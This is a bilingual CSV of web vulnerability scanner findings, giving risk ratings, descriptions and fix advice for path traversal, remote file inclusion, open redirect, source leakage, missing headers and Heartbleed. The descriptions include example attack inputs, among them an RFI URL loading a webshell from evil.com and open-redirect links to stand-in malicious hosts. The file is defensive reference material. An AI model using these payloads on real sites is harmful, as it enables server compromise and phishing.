id,type,origin,enabled,risk,cost,name_en,name_zh,desc_en,desc_zh,advice_en,advice_zh
0,A1,Directory Browsing,TRUE,,,,,,,,
2,A1,Private IP Disclosure,TRUE,,,,,,,,
3,A1,Session ID in URL Rewrite,TRUE,,,,,,,,
6,A1,Path Traversal,TRUE,High,Medium,Directory Traversal,路徑遍尋,"We detected that your website is vulnerable to dirctory traversal.
 A directory traversal attack allows an attacker access to arbritrary restricted files directories and sensitive commands by manipulating a url. Any device that exposes an http-based interface is potentially vulnerable to path traversal. This vulnerability allows attackers to read sensitive information within the websites restricted files, and may lead to data exposure, credential leakage, and accont compromise. Attackers may utilize special-characters sequences, for example the ../ special-character sequence, to alter the resource location requested in the url. Advanced information： Although most popular web servers will prevent this technique with security filters, attackers may bypass them using alternate encodings, including unicode-encoded slash characters, url encoded characters, and double url encodings. Even if the web server properly restricts path traversal attempts in the url path, a web application may still be vulnerable due to improper handling of user-supplied input, such as substituting the original url parameter value with the file name of one of the web application's dynamic scripts. Consequently the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (.) to reveal the listing of the current working directory or %00 null characters in order to bypass rudimentary file extension checks.","檢測到您的網站有被路徑遍尋攻擊的可能。
​此攻擊會導致攻擊者訪問未開放的隱私路徑，使網站邏輯或是隱私洩露，常見於洩漏index目錄中的logs文件內容導致揭露使用者資訊及系統資訊，進而產生一系列如帳號列舉等攻擊。​ 路徑遍尋攻擊是使攻擊者可以訪問位於Web根目錄之外的文件目錄和命令，能以特定方式操縱URL，使網站可以執行或顯示Web服務器上任何位置的任意文件的內容，最基本的路徑遍歷攻擊是使用 ../ 特殊字符序列來更改url中請求的資源位置。","• When evaluating request parameters, use a whitelist of acceptable inputs and reject any input that does not strictly conform to specifications. Use blacklists to detect potential attacks or reject malformed inputs. Do not rely exclusively on blacklist.
•During input validation, consider all relevant properties including length, type of input, syntax consistency, and conformance to business rules.
• For filenames, limit the allowed character set and file extensions, and exclude directory separators such as /. 
• Make sure that your application does not decode the same input twice. 
• Run your code using the lowest privileges that are required, and in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This ensures that high privileged actions are prohibited even when an attacker has compromised an account.""","• 使用嚴格符合規範的白名單，拒絕任何不符合規範的輸入。 ​
• 在執行輸入驗證時，請考慮所有可能相關的屬性，包括輸入的長度、類型等。​
• 對於文件名，限制允許的字符集和文件擴展名，並排除目錄分隔符，例如 /。
• 確保您的應用程序不會對相同的輸入進行兩次解碼。
• 如果可能，請創建僅用於單個任務的具有有限的特權的隔離帳戶，即使攻擊者成功獲取該權限，也無法立即訪問網頁的其餘需較高權限部分或其環境。"""
7,A3,Remote File Inclusion,TRUE,High,,Remote File Inclusion,文件引用（遠端文件）,"Remote File Include (RFI) is an attack technique used to exploit “dynamic file include” mechanisms in web applications. When web applications take user input (URL, parameter value, etc.) and pass them into file include
 commands, the web application might be tricked into including remote files with malicious code. Almost all web application frameworks support file inclusion. File inclusion is mainly used for packaging common code into separate files that are later referenced by main application modules. When a web application references an include file, the code in this file may be executed implicitly or explicitly by calling specific procedures. If the choice of module to load is based on elements from the HTTP request, the web application might be vulnerable to RFI. An attacker can use RFI for： * Running malicious code on the server： any code in the included malicious files will be run by the server. If the file include is not executed using some wrapper, code in include files is executed in the context of the server user. This could lead to a complete system compromise. * Running malicious code on clients： the attacker's malicious code can manipulate the content of the response sent to the client. The attacker can embed malicious code in the response that will be run by the client (for example, JavaScript to steal the client session cookies). PHP is particularly vulnerable to RFI attacks due to the extensive use of “file includes” in PHP programming and due to default server configurations that increase susceptibility to an RFI attack.",檢測到您的網站有引用遠程文件的風險，可能使您的網站中意外帶入有風險的文件，常見為網站遠程引用含有竊取用戶cookie的惡意程式文件。 遠程文件引用是網頁為了讓自身可以插入不在本地伺服器的文件而設定的功能，但因為設置及防護不足而導致使駭客有可乘之機。 攻擊範例可能如下：駭客將以下指令包含進網頁之中https：//example.com/index.php?page=https：//evil.com/uploads/webshell.txt 使雖然前面是正常引用的正常文件，卻被連結到惡意網站中。,"• Make sure that remote file references are disabled in the configuration, and if the Allow_url_include can be set to '0' in PHP. In addition, it is recommended that all inputs such as URLs need to be validated before passing the data","• 確保程式語言的配置中禁用遠程文件引用，且若是在
PHP中可以allow_url_include設置為'0'。 此外，建議所有的輸入，例如：URL 需進行驗證，才將資料進行傳遞。"""
41,A5,Source Code Disclosure - Git ,TRUE,,,,,,,,
42,A5,Source Code Disclosure - SVN,TRUE,Medium,Low,Source SVN Leakage,SVN原始碼揭露,The source code for the current page was disclosed by the web server .,"檢測到您的網站可能有SVN原始碼洩露的風險。 
此風險會導致駭客獲取Server的原始碼甚至SVN Server上的帳號密碼。 通常風險的發生原因是因為在網站部署時未將程式碼匯出，導致不小心直接將所有SVN部署資訊及敏感資料送至外部。 ",• Ensure that SVN metadata files are not deployed to the web server or application server,"• 確認網站上無.svn/entries的檔案以及設定不允許使用者嘗試在URL輸入此字尾 。
• 設定完成後以報告中路徑測試，再次確認使用者無法存取檔案。"
43,A5,Source Code Disclosure - File Inclusion,TRUE,High,High,Source File Leakage,原始碼揭露,"We detected that your website leaks source code using local file inclusion. Source code often contains some form of sensitive information, such as configuration-related information (e.g. database credentials), username, passwords, or the internal workings and business logic of the web application. If source code files are disclosed, an attacker may use such information to discover logical flaws or obtain account information from databases or administrative panels. This may escalate to a chain of attacks, including SQL Injection, database takeovers, and remote code execution which would lead to data leakage, malware infections, or service denial.","檢測到您的網站可能有原始碼揭露的問題。​
如果公開原始碼文件，攻擊者可能使用此類的信息來發現邏輯缺陷，​例如密碼邏輯或是正規式漏洞導致攻擊者可以依據文件中漏洞縮小密碼列舉範圍、執行SQL注入、資料庫接管或遠程代碼執行等一系列攻擊。​ 原始碼通常包含某些形式的敏感信息，例如與配置相關的信息（例如資料庫憑證），或是Web應用程序工作方式的信息。","• Confirm exactly what aspects of the source code are actually disclosed and determine if it is necessary 
• If a file is required by the application, change its permissions to prevent public users from accessing it. Otherwise, remove it from the web server. 
• Remove all temporary and backup files from the web server.""","• 確認揭露的原始碼是否需要公開。​ 
• 如果應用程序需要這些文件，請更改權限禁止公開存取該文件，否則，請從Web伺服器中將其刪除。​ 
• 從Web伺服器上刪除所有臨時和備份文件。"
10003,A6,Vulnerable JS Library,TRUE,High,High,Vulnerable JS Library,有漏洞的JS函式庫,,"檢測到您的網站使用有已知漏洞的 JS 函式庫版本。
駭客可以利用此版本的弱點對您的服務進行攻擊。",,"• 請使用最新版本函式庫(jQuery 3.5.0以上版本)。
程式或框架中，若有使用到第三方資源，則需特別注意引用的版本是否安全，定期更新使用最新版本或無漏洞之穩定版本。"
10010,A5,Cookie No HttpOnly Flag,TRUE,Low,Low,Misconfigured Cookie： Missing HttpOnly Attribute,標頭配置錯誤（缺少 HttpOnly 屬性）,"A cookie has been set without the HttpOnly flag, which means that the cookie can be accessed by JavaScript. If a malicious script can be run on this page then the cookie will be accessible and can be transmitted to another site. If this is a session cookie then session hijacking may be possible.",檢測到您的網站在標頭中缺少HttpOnly屬性，該屬性可用來會限制cookie只能經由 HTTP(S)協定來存取。因此當網站有XSS弱點時，若cookie含有HttpOnly flag，則攻擊者無法直接經由JavaScript存取使用者的session cookie，可降低使用者身份被盜用的機率。 針對跨網站偽造要求的攻擊(cross-site request forgery attacks)作保護。,Ensure that the HttpOnly flag is set for all cookies.,• 以Java設置HttpOnly為例，可以在WEB-INF/web.xml進行設定 <session-config> <cookie-config> <http-only>true</http-only> </cookie-config> </session-config> 即可設置HttpOnly於session cookie。
10011,A5,Cookie Without Secure Flag,TRUE,Low,Low,Misconfigured Cookie： Missing Secure Attribute,標頭配置錯誤（缺少 Secure 屬性）,"A cookie has been set without the secure flag, which means that the cookie can be accessed via unencrypted connections.","檢測到您的網站在標頭中缺少Secure 屬性，該屬性用以
限制Cookie 傳輸的方式。 如果Secure Attribute 設置為True 時，Cookie只能以""""安全""""的形式向伺服器傳輸，例如是HTTPS 的方式，並在過程中進行加密使Cookie 的內容不容易被竊取。","Whenever a cookie contains sensitive information or is a session token, then it should always be passed using an encrypted channel. Ensure that the secure flag is set for cookies containing such sensitive information.",• 以java為例可以在Cookie Interface設置 cookie.setSecure(true); 或是web.xml中設置 <session-config> <cookie-config> <secure>true</secure> </cookie-config> </session-config>。
10015,A4,Incomplete or No Cache-control Header Set,TRUE,Low,Low,Misconfigured Headers： Missing Cache-control and Pragma,標頭配置錯誤（缺少 Cache-control and Pragma）,The cache-control and pragma HTTP header have not been set properly or are missing allowing the browser and proxies to cache content.,檢測到您的網站在標頭中缺少Cache-control及Pragma，該屬性可用來限制網頁快取不被共用的快取伺服器存取及設定快取有效期限，使快取資源有有效期限，不易被駭客利用。,"Whenever possible ensure the cache-control HTTP header is set with no-cache, no-store, must-revalidate; and that the pragma HTTP header is set with no-cache.","• 可設定不要存任何快取Cache-Control：no-store或是快取需存取，但是要重新驗證Cache-Control：no-cache 設定快取不能被共用的快取伺服器儲存Cache-Control：private設定快取有效期限Cache-Control：max-age=3600驗證快取伺服器先發送請求訊息給網頁伺服器驗證，確認是有效期限且檔案有更新的回覆，舊的檔案就不能使用。"""
10017,A8,Cross-Domain JavaScript Source File Inclusion,TRUE,Low,High,Cross-Domain File Inclusion： Javascript,跨域引用檔案（Javascript）,The page includes one or more script files from a third-party domain.,檢測到您的網站包含其他人的程式碼，可能含有風險的程式碼或導致用戶遭竊取敏感信息/資源。 會使您無法控制該程式碼中的內容，也無法控制託管該程式碼的伺服器安全性。 當您的某些JavaScript文件位於不受您管理的第三方域上時，攻擊者可能會嘗試劫持該域或訪問該第三方伺服器導致文件被惡意內容替換。,"Ensure JavaScript source files are loaded from only trusted sources, and the sources can't be controlled by end users of the application.",• 確保只從受信任的來源及域載入JavaScript文件 將所有應用程序文件託管在伺服器或直得信任的第三方服務（例如CDN）。
10019,A8,Content-Type Header Missing,TRUE,,,,,,,,
10020,A4,X-Frame-Options Header,TRUE,Low,Low,Misconfigured Headers：X-Frame-Options,標頭配置錯誤（X-Frame-Options）,"We detected that your website is missing the X-Frame-Options 
header and is vulnerable to clickjacking attacks. Clickjacking is an attack that tricks a user into clicking a webpage element which is invisible or disguised as another element. Typically, clickjacking is performed by displaying an invisible page or HTML element, inside an iframe, on top of the page the user sees. The user believes they are clicking the visible page but in fact they are clicking an invisible element in the additional page transposed on top of it. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online. The X-Frame-Options HTTP header field indicates whether the browser should render the transmitted resource within <frame>, <iframe>, <embed>, or <object>. Servers can declare this policy in the header of their HTTP responses to prevent clickjacking attacks, which ensures that their content is not embedded into other pages or frames. ","檢測到您的網站缺少或未正確設定X-Frame-Options標頭，這表示網站有遭受點擊劫持攻擊的風險。
點擊劫持是一種攻擊者在惡意網站上通過iframe載入目標網頁，然後隱藏目標網頁，欺騙用戶點擊隱藏的惡意連結，使用戶認為他們點擊的是目前所見頁面，但實際上，他們點擊的是附加所見頁面上的不可見元素。","• 'X-Frame-Options： DENY' completely denies to be loaded in frame/iframe. In /etc/apache2/conf-enabled/security.conf (debian) or /etc/httpd/conf/httpd.conf (redhat), add the entry： Header set X-Frame-Options： DENY 
• 'X-Frame-Options： SAMEORIGIN' allows only if the site which wants to load has a same origin. In /etc/apache2/conf-enabled/security.conf (debian) or /etc/httpd/conf/httpd.conf (redhat), add the entry： Header set X-Frame-Options： SAMEORIGIN 
","• 如果您的網站不須使用X-Frame，請將X-Frame-Options設定為DENY，以預防攻擊者利用X-Frame攻擊。
以常見的網站伺服器Apache為例，請在security.conf中新增一行設定「Header set X-Frame-Options: ""DENY""」，其他網站伺服器請參考相關安全性設定。
• 如果您的網站會用到來自內部的X-Frame，請將X-Frame-Options設定為SAMEORIGIN，以防止從外部嵌入的X-Frame。以常見的網站伺服器Apache為例，請在security.conf中新增一行設定「Header set X-Frame-Options: ""SAMEORIGIN""」，其他網站伺服器請參考相關安全性設定。"
10021,A5,X-Content-Type-Options Header Missing,TRUE,Low,Low,Misconfigured Headers： Missing X-Content-Type-Options,標頭配置錯誤（缺少X-Content-Type-Options）,"The Anti-MIME-Sniffing header X-Content-Type-Options was not set to nosniff. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, 
potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.",檢測到您的網站在標頭中缺少 X-Content-Type-Options設定，該設定可避免瀏覽器誤判文件形態，防止Content-Type被竄改，降低跨站點腳本（XSS）攻擊的風險。,"Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages. If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.",• 在您的WebServer設定一個帶有'nosniff'值的'X-Content-Type-Options'標頭。
10023,A1,Information Disclosure - Debug Error Messages,TRUE,Low,Low,Debug Message Leakage,偵錯信息揭露,"We detected that your website leaks debug messages with detailed descriptions. This vulnerability may disclose sensitive information like the location of the file that produced the unhandled exception and the internal logic of the source code. Attackers may use this information to fingerprint and launch further attacks against the web application, such as substituting existing files to execute malicious code or identifying additional vulnerable targets.",檢測到您的網站頁面包含一條偵錯信息，該信息可能會洩露敏感資訊，造成安全風險。 例如發現紀錄異常的文件位置，內容包含網頁結構及資料夾名稱，導致攻擊者可藉此針對網頁進行資料探尋、替換等攻擊行為。 偵錯信息可用於對網頁應用程序發起進一步的攻擊， 例如利用洩漏的程式邏輯尋找程式漏洞或是辨識其他可能利用的攻擊目標。,"• Review the source code of this page and remove any debug messages or unprotected debugging functionality. 
•Only allow debug message logging on the server side and do not expose them to the user.","• 查看此頁面的原始碼，並移除任何可能顯示給用戶的偵錯信息。確認偵錯用的指令或是api有驗證保護。 
• 確認偵錯信息的紀錄留存只在伺服器端。"
10024,A1,Information Disclosure - Sensitive Information in URL,TRUE,,,,,,,,
10025,A1,Information Disclosure - Sensitive Information in HTTP Referrer Header,TRUE,,,,,,,,
10026,A3,HTTP Parameter Override,TRUE,,,,,,,,
10027,A1,Information Disclosure - Suspicious Comments,TRUE,,,,,,,,
10028,A1,Open Redirect,TRUE,High,Medium,Open Redirect,不安全的重新導向,Open redirects are one of the OWASP 2010 Top Ten vulnerabilities. This check looks at user-supplied input in query string parameters and POST data to identify where open redirects might be possible. Open redirects occur when an application allows user-supplied input (e.g. http：//nottrusted.com) to control an offsite redirect. This is generally a pretty accurate way to find where 301 or 302 redirects could be exploited by spammers or phishing attacks. For example an attacker could supply a user with the following link： http：//example.com/example.php?url=http：//malicious.example.com.,檢測到您的網站有不安全的重導向風險，原因是您的網站開放在URL重新導向的功能，這會使用戶訪問可信任的網站URL時，將用戶重新導向到惡意網站，屬於釣魚手段的一種。 舉例來說：http://true.com/etrue.php?url=http://evil.com 最後會被導向到evil中。,"To avoid the open redirect vulnerability, parameters of the application  script/program must be validated before sending 302 HTTP code (redirect) to the client browser. Implement safe redirect functionality that only redirects to relative URI's, or a list of trusted domains","• 停用轉址功能 。
• 排除特殊字元符號，像是「<」、「/」、「>」等避免注入攻擊 。
• 建立轉址白名單，只有在白名單上的網路位址才能進行導向。"
10029,A3,Cookie Poisoning,TRUE,,,,,,,,
10030,A3,User Controllable Charset,TRUE,,,,,,,,
10031,A3,User Controllable HTML Element Attribute (Potential XSS),TRUE,,,,,,,,
10032,A4,Viewstate,FALSE,,,Viewstate,ViewState中含敏感資料,"We detected that your website leaks sensitive information in the ViewState context. Sensitive information include non-public emails, or IPs of other internal services. The ViewState is a mechanism built in to the ASP.NET platform for persisting elements of the user interface and other data across successive requests. The data to be persisted is serialized by the server and transmitted via a hidden form field. When it is posted back to the server, the ViewState parameter is deserialized and the data is retrieved.",檢測到您的網站在ViewState上下文中有敏感資訊洩漏。 常見的敏感資訊洩漏包含非公開電子郵件，或是內部其他 服務的IP，ViewState是ASP.NET平台中內置的一種機制，用於在連續請求中持久保留用戶界面元素和其他數據。 服務器將要保留的數據序列化，並通過隱藏的表單字段進行傳輸。 將其發布回伺服器後，將對ViewState參數進行反序列化並檢索數據。,"• Please verify if the provided emails are confidential. 
• Remove or hide all detected emails as appropriate.
• Please verify if the provided IPs are confidential. 
• Remove or hide all detected IPs as appropriate.","• 請驗證所檢測的電子郵件是否為機密信息。 
• 移除或隱藏所有網頁上檢測到的非公開的電子郵件。
• 請驗證所檢測的IP位置是否為機密信息。 
• 移除或隱藏所有網頁上檢測到的非公開的IP位置。"
10033,A1,Directory Browsing,TRUE,Medium,Medium,Directory Browsing,目錄瀏覽,"We detected that your server has enabled directory browsing.
This allows anyone who visits your service to navigate through the folders of your server and expose sensitive information. It also allows hackers to fingerprintf your services and broaden the attack surface. By default, the Apache2 server comes with directory browsing enabled.",檢測到您的網站啟用目錄瀏覽，此功能可能會導致有安全疑慮的產生。此風險會使任何訪問您服務的人都可以瀏覽服務器的資料夾，並公開敏感信息。 默認情況下，Apache2服務器帶有啟用目錄瀏覽的功能，常因而導致此風險產生。,"• Find the location of Apache's main configuration file 'apache2.conf', usually under '/etc/apache2/apache2.conf'. 
• Edit this file with root access to your server, and modify this line by adding a preceding '-' sign to the word 'Indexes'： 'Options Indexes FollowSymLinks' change to 'Options -Indexes FollowSymLinks' • Save the file and restart Apache Alternatively, edit the '.htaccess' and modify the Options line as 'Options -Indexes","• 查找Apache主要配置文件"" apache2.conf”的位置，通常在“ /etc/apache2/apache2.conf”下。 
• 使用對服務器的root訪問權限來編輯此文件，並通過在單詞“索引”中添加前面的“-”符號來修改此行： '選項索引FollowSymLinks'更改為'選項-索引FollowSymLinks' 。
• 保存文件並重新啟動Apache 或者，編輯“ .htaccess”並將“選項”行修改為“選項-索引””"
10034,A4,Heartbleed OpenSSL Vulnerability (Indicative),TRUE,High,Medium,HeartBleed (CVE-2014-0160),HeartBleed (CVE-2014-0160),"We detected that this website uses HeartBeat Extension packets, which is vulnerable to the HeartBleed OpenSSl attack.
This allows remote attackers to disclose sensitive information, including SSL encryptions keys, authentication tokens, and even system credentials, from process memory via crafted packets.
This vulnerability exists because the TLS and DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which as a result may trigger a buffer overread.","檢測到您的網站有Heartbeat Extension數據包。
HeartBleed可能導致觸發緩衝區溢位的安全問題。 攻擊者可透過此弱點傳送緩衝區溢位資訊去觸發Heartbeat Extension數據包，導致客戶端與伺服器之間記憶體資料出錯而洩漏機敏資料，包含用來加密 SSL 密鑰與認證用的 Token。 在OpenSSL 1.0.1g之前的版本 ，TLS和DTLS無法準確的處理Heartbeat Extension數據包，這使遠端攻擊者可以通過觸發緩衝區溢位從程序的內部儲存中獲取敏感信息。","• If possible, update to OpenSSL 1.0.1g or later. 
• Otherwise, get a patch from your vendor. Most Linux distribution vendors have been publishing updated packages (Fedora, RedHat, CentOS, Debian, etc). 
• Turn off TLS HeartBeats if you have access to the source code. 
• Change asymmetric private keys and shared secret keys, since these may have been compromised. 
• Re-issue HTTPS certificates 
• Invalidate session keys and cookies 
• Reset passwords and shared secrets 
• Revoke old certificates 
• Update your IPS and firewall signatures and enable Heartbleed signatures. Contact your vendor if necessary.","• 在允許的情況下更新到OpenSSL 1.0.1g或更高版本。 
• 從供應商處獲取補丁（大多數Linux發行商已經發布了更新的軟件包Fedora，RedHat，CentOS，Debian等）。  
•如果您有權變更原始碼，請關閉TLS HeartBeats。 
• 變更非對稱私鑰和共享密鑰、重新分發HTTPS憑證、取消舊憑證、因為它們可能已被洩漏或竄改。 
• 更新您的IPS和防火牆簽名，並啟用Heartbleed簽名。 如有必要，請與您的供應商聯繫。"""
10035,A2,Strict-Transport-Security Header,TRUE,,,Misconfigured Headers： Missing Strict-Transport-Security,標頭配置錯誤（缺少 Strict-Transport-Security）,"HTTP Strict Transport Security (HSTS) is a web security policy
 mechanism whereby a web server declares that complying user agents (such as a web browser) are to interact with it using only secure HTTPS connections (i.e. HTTP layered over TLS/SSL). HSTS is an IETF standards track protocol and is specified in RFC 6797.",檢測到您的網站在標頭中缺少Strict-Transport-Security設定，此設定是一種可選擇的安全性強化功能，由Web應用程序通過使用標頭指定。 一旦受瀏覽器收到此標頭，瀏覽器將只能通過HTTPS發送資訊，阻止HTTP發送任何資訊。,"•Ensure that your web server, application server, load balancer, 
etc. is configured to enforce Strict-Transport-Security.",• 在您的WebServer設定一個Strict-Transport-Security： max-age=31536000; includeSubDomains的標頭 ＊此設定會導致只能通過HTTP進行服務的頁面的訪問失敗。
10036,A1,HTTP Server Response Header,TRUE,,,,,,,,
10037,A1,"Server Leaks Information via ""X-Powered-By"" HTTP Response Header Field(s)",TRUE,Low,Low,Header Leakage： X-Powered-By,標頭資訊洩露（X-Powered-By）,"We discovered that your website leaks technology information in the 'Server' header. This vulnerability may disclose the employed programming languages and frameworks of the backend server, allowing the attacker to fingerprint the site's technologies and pinpoint potential vulnerabilities in outdated software. An attacker may leverage this knowledge to attack your website when a new vulerability is released in the future.",檢測到您的網站在標頭中洩漏 X-Powered-By 信息，該信息可能會洩露後端伺服器資訊以及所使用的程式語言或框架，造成安全風險。攻擊者可比照各種軟韌體版本資訊找出過期或未修補的系統，進而滲透利用。即使當前版本安全，未來若此版本有新漏洞釋出，您的網站可能因洩漏此資訊而在短時間內遭到攻擊。,"•Remove the X-Powered-By HTTP header. To configure this on Apache： Add these lines in httpd.conf： <IfModule mod_headers.c> Header unset X-Powered-By </IfModule> To configure this on nginx： Add this line in nginx.conf： proxy_hide_header X-Powered-By; Additionally, you must also modify the configuration for used languages(ex： PHP) and framework(ex： Tomcat) to remove the X-Powered-By header. To configure this on IIS： Change the system.webSerer section in Web.config as below： <system.webServer>","• 在IIS伺服器中的Web.config修改system.webServer區段：
<httpProtocol><customHeaders><remove name=""X-Powered-By"" /></customHeaders></httpProtocol></system.webServer>"
10038,A5,Content Security Policy (CSP) Header Not Set,TRUE,Medium,Low,Misconfigured Headers： Missing CSP,標頭配置錯誤（缺少CSP）,"Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware. CSP provides a set of standard HTTP headers that allow website owners to declare approved sources of content that browsers should be allowed to load on that page — covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.","檢測到您的網站在標頭中缺少內容安全策略（CSP）。
內容安全策略（CSP）是附加性的安全措施，有助於檢測和緩解某些類型的攻擊，包括跨域腳本攻擊（XSS）和數據注入攻擊。 CSP提供了一組標準HTTP標頭，允許網站所有者聲明允許瀏覽器在該頁面上加載的已批准內容來源-涵蓋的類型包括JavaScript，CSS，HTML框架，字體，圖像和可嵌入對象，例如Java applet，ActiveX，音頻和視頻文件。","•Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header, to achieve optimal browser support： 'Content-Security-Policy' for Chrome 25+, Firefox 23+ and Safari 7+, 'X-Content-Security-Policy' for Firefox 4.0+ and Internet Explorer 10+, and 'X-WebKit-CSP' for Chrome 14+ and Safari 6+","• 限制外部連入的檔案和禁用inline語法，這是預設全部阻擋的寫法，也是最嚴格最安全的方案，設定範例如下
content-security-policy: default-src 'none';
• 增加外部連入的白名單，限制外部連入的來源，請避免在來源url中使用「*」，設定範例如下
content-security-policy: default-src 'none'; 
script-src 'self' https://www.google.com;
• 避免在CSP設定中使用「unsafe-inline」"
10039,A1,X-Backend-Server Header Information Leak,TRUE,Low,Low,Misconfigured Headers： X-Backend-Server,標頭配置錯誤（X-Backend-Server）,The server is leaking information pertaining to backend systems (such as hostnames or IP addresses). Armed with this information an attacker may be able to attack other systems or more directly/efficiently attack those systems.,檢測到您的網站中標頭有後端Server版本資料揭露的風險。因為Server配置標頭設定時，未特別針對後端Server的訊息做隱藏，這可能會導致後端Server的主機名稱和IP位置揭露，使攻擊者可以更針對性的設計攻擊。,"Ensure that your web server, application server, load balancer, etc. is configured to suppress X-Backend-Server headers.", 確認報告中後端Server的洩漏訊息，確保無主機名稱和IP位置揭露。
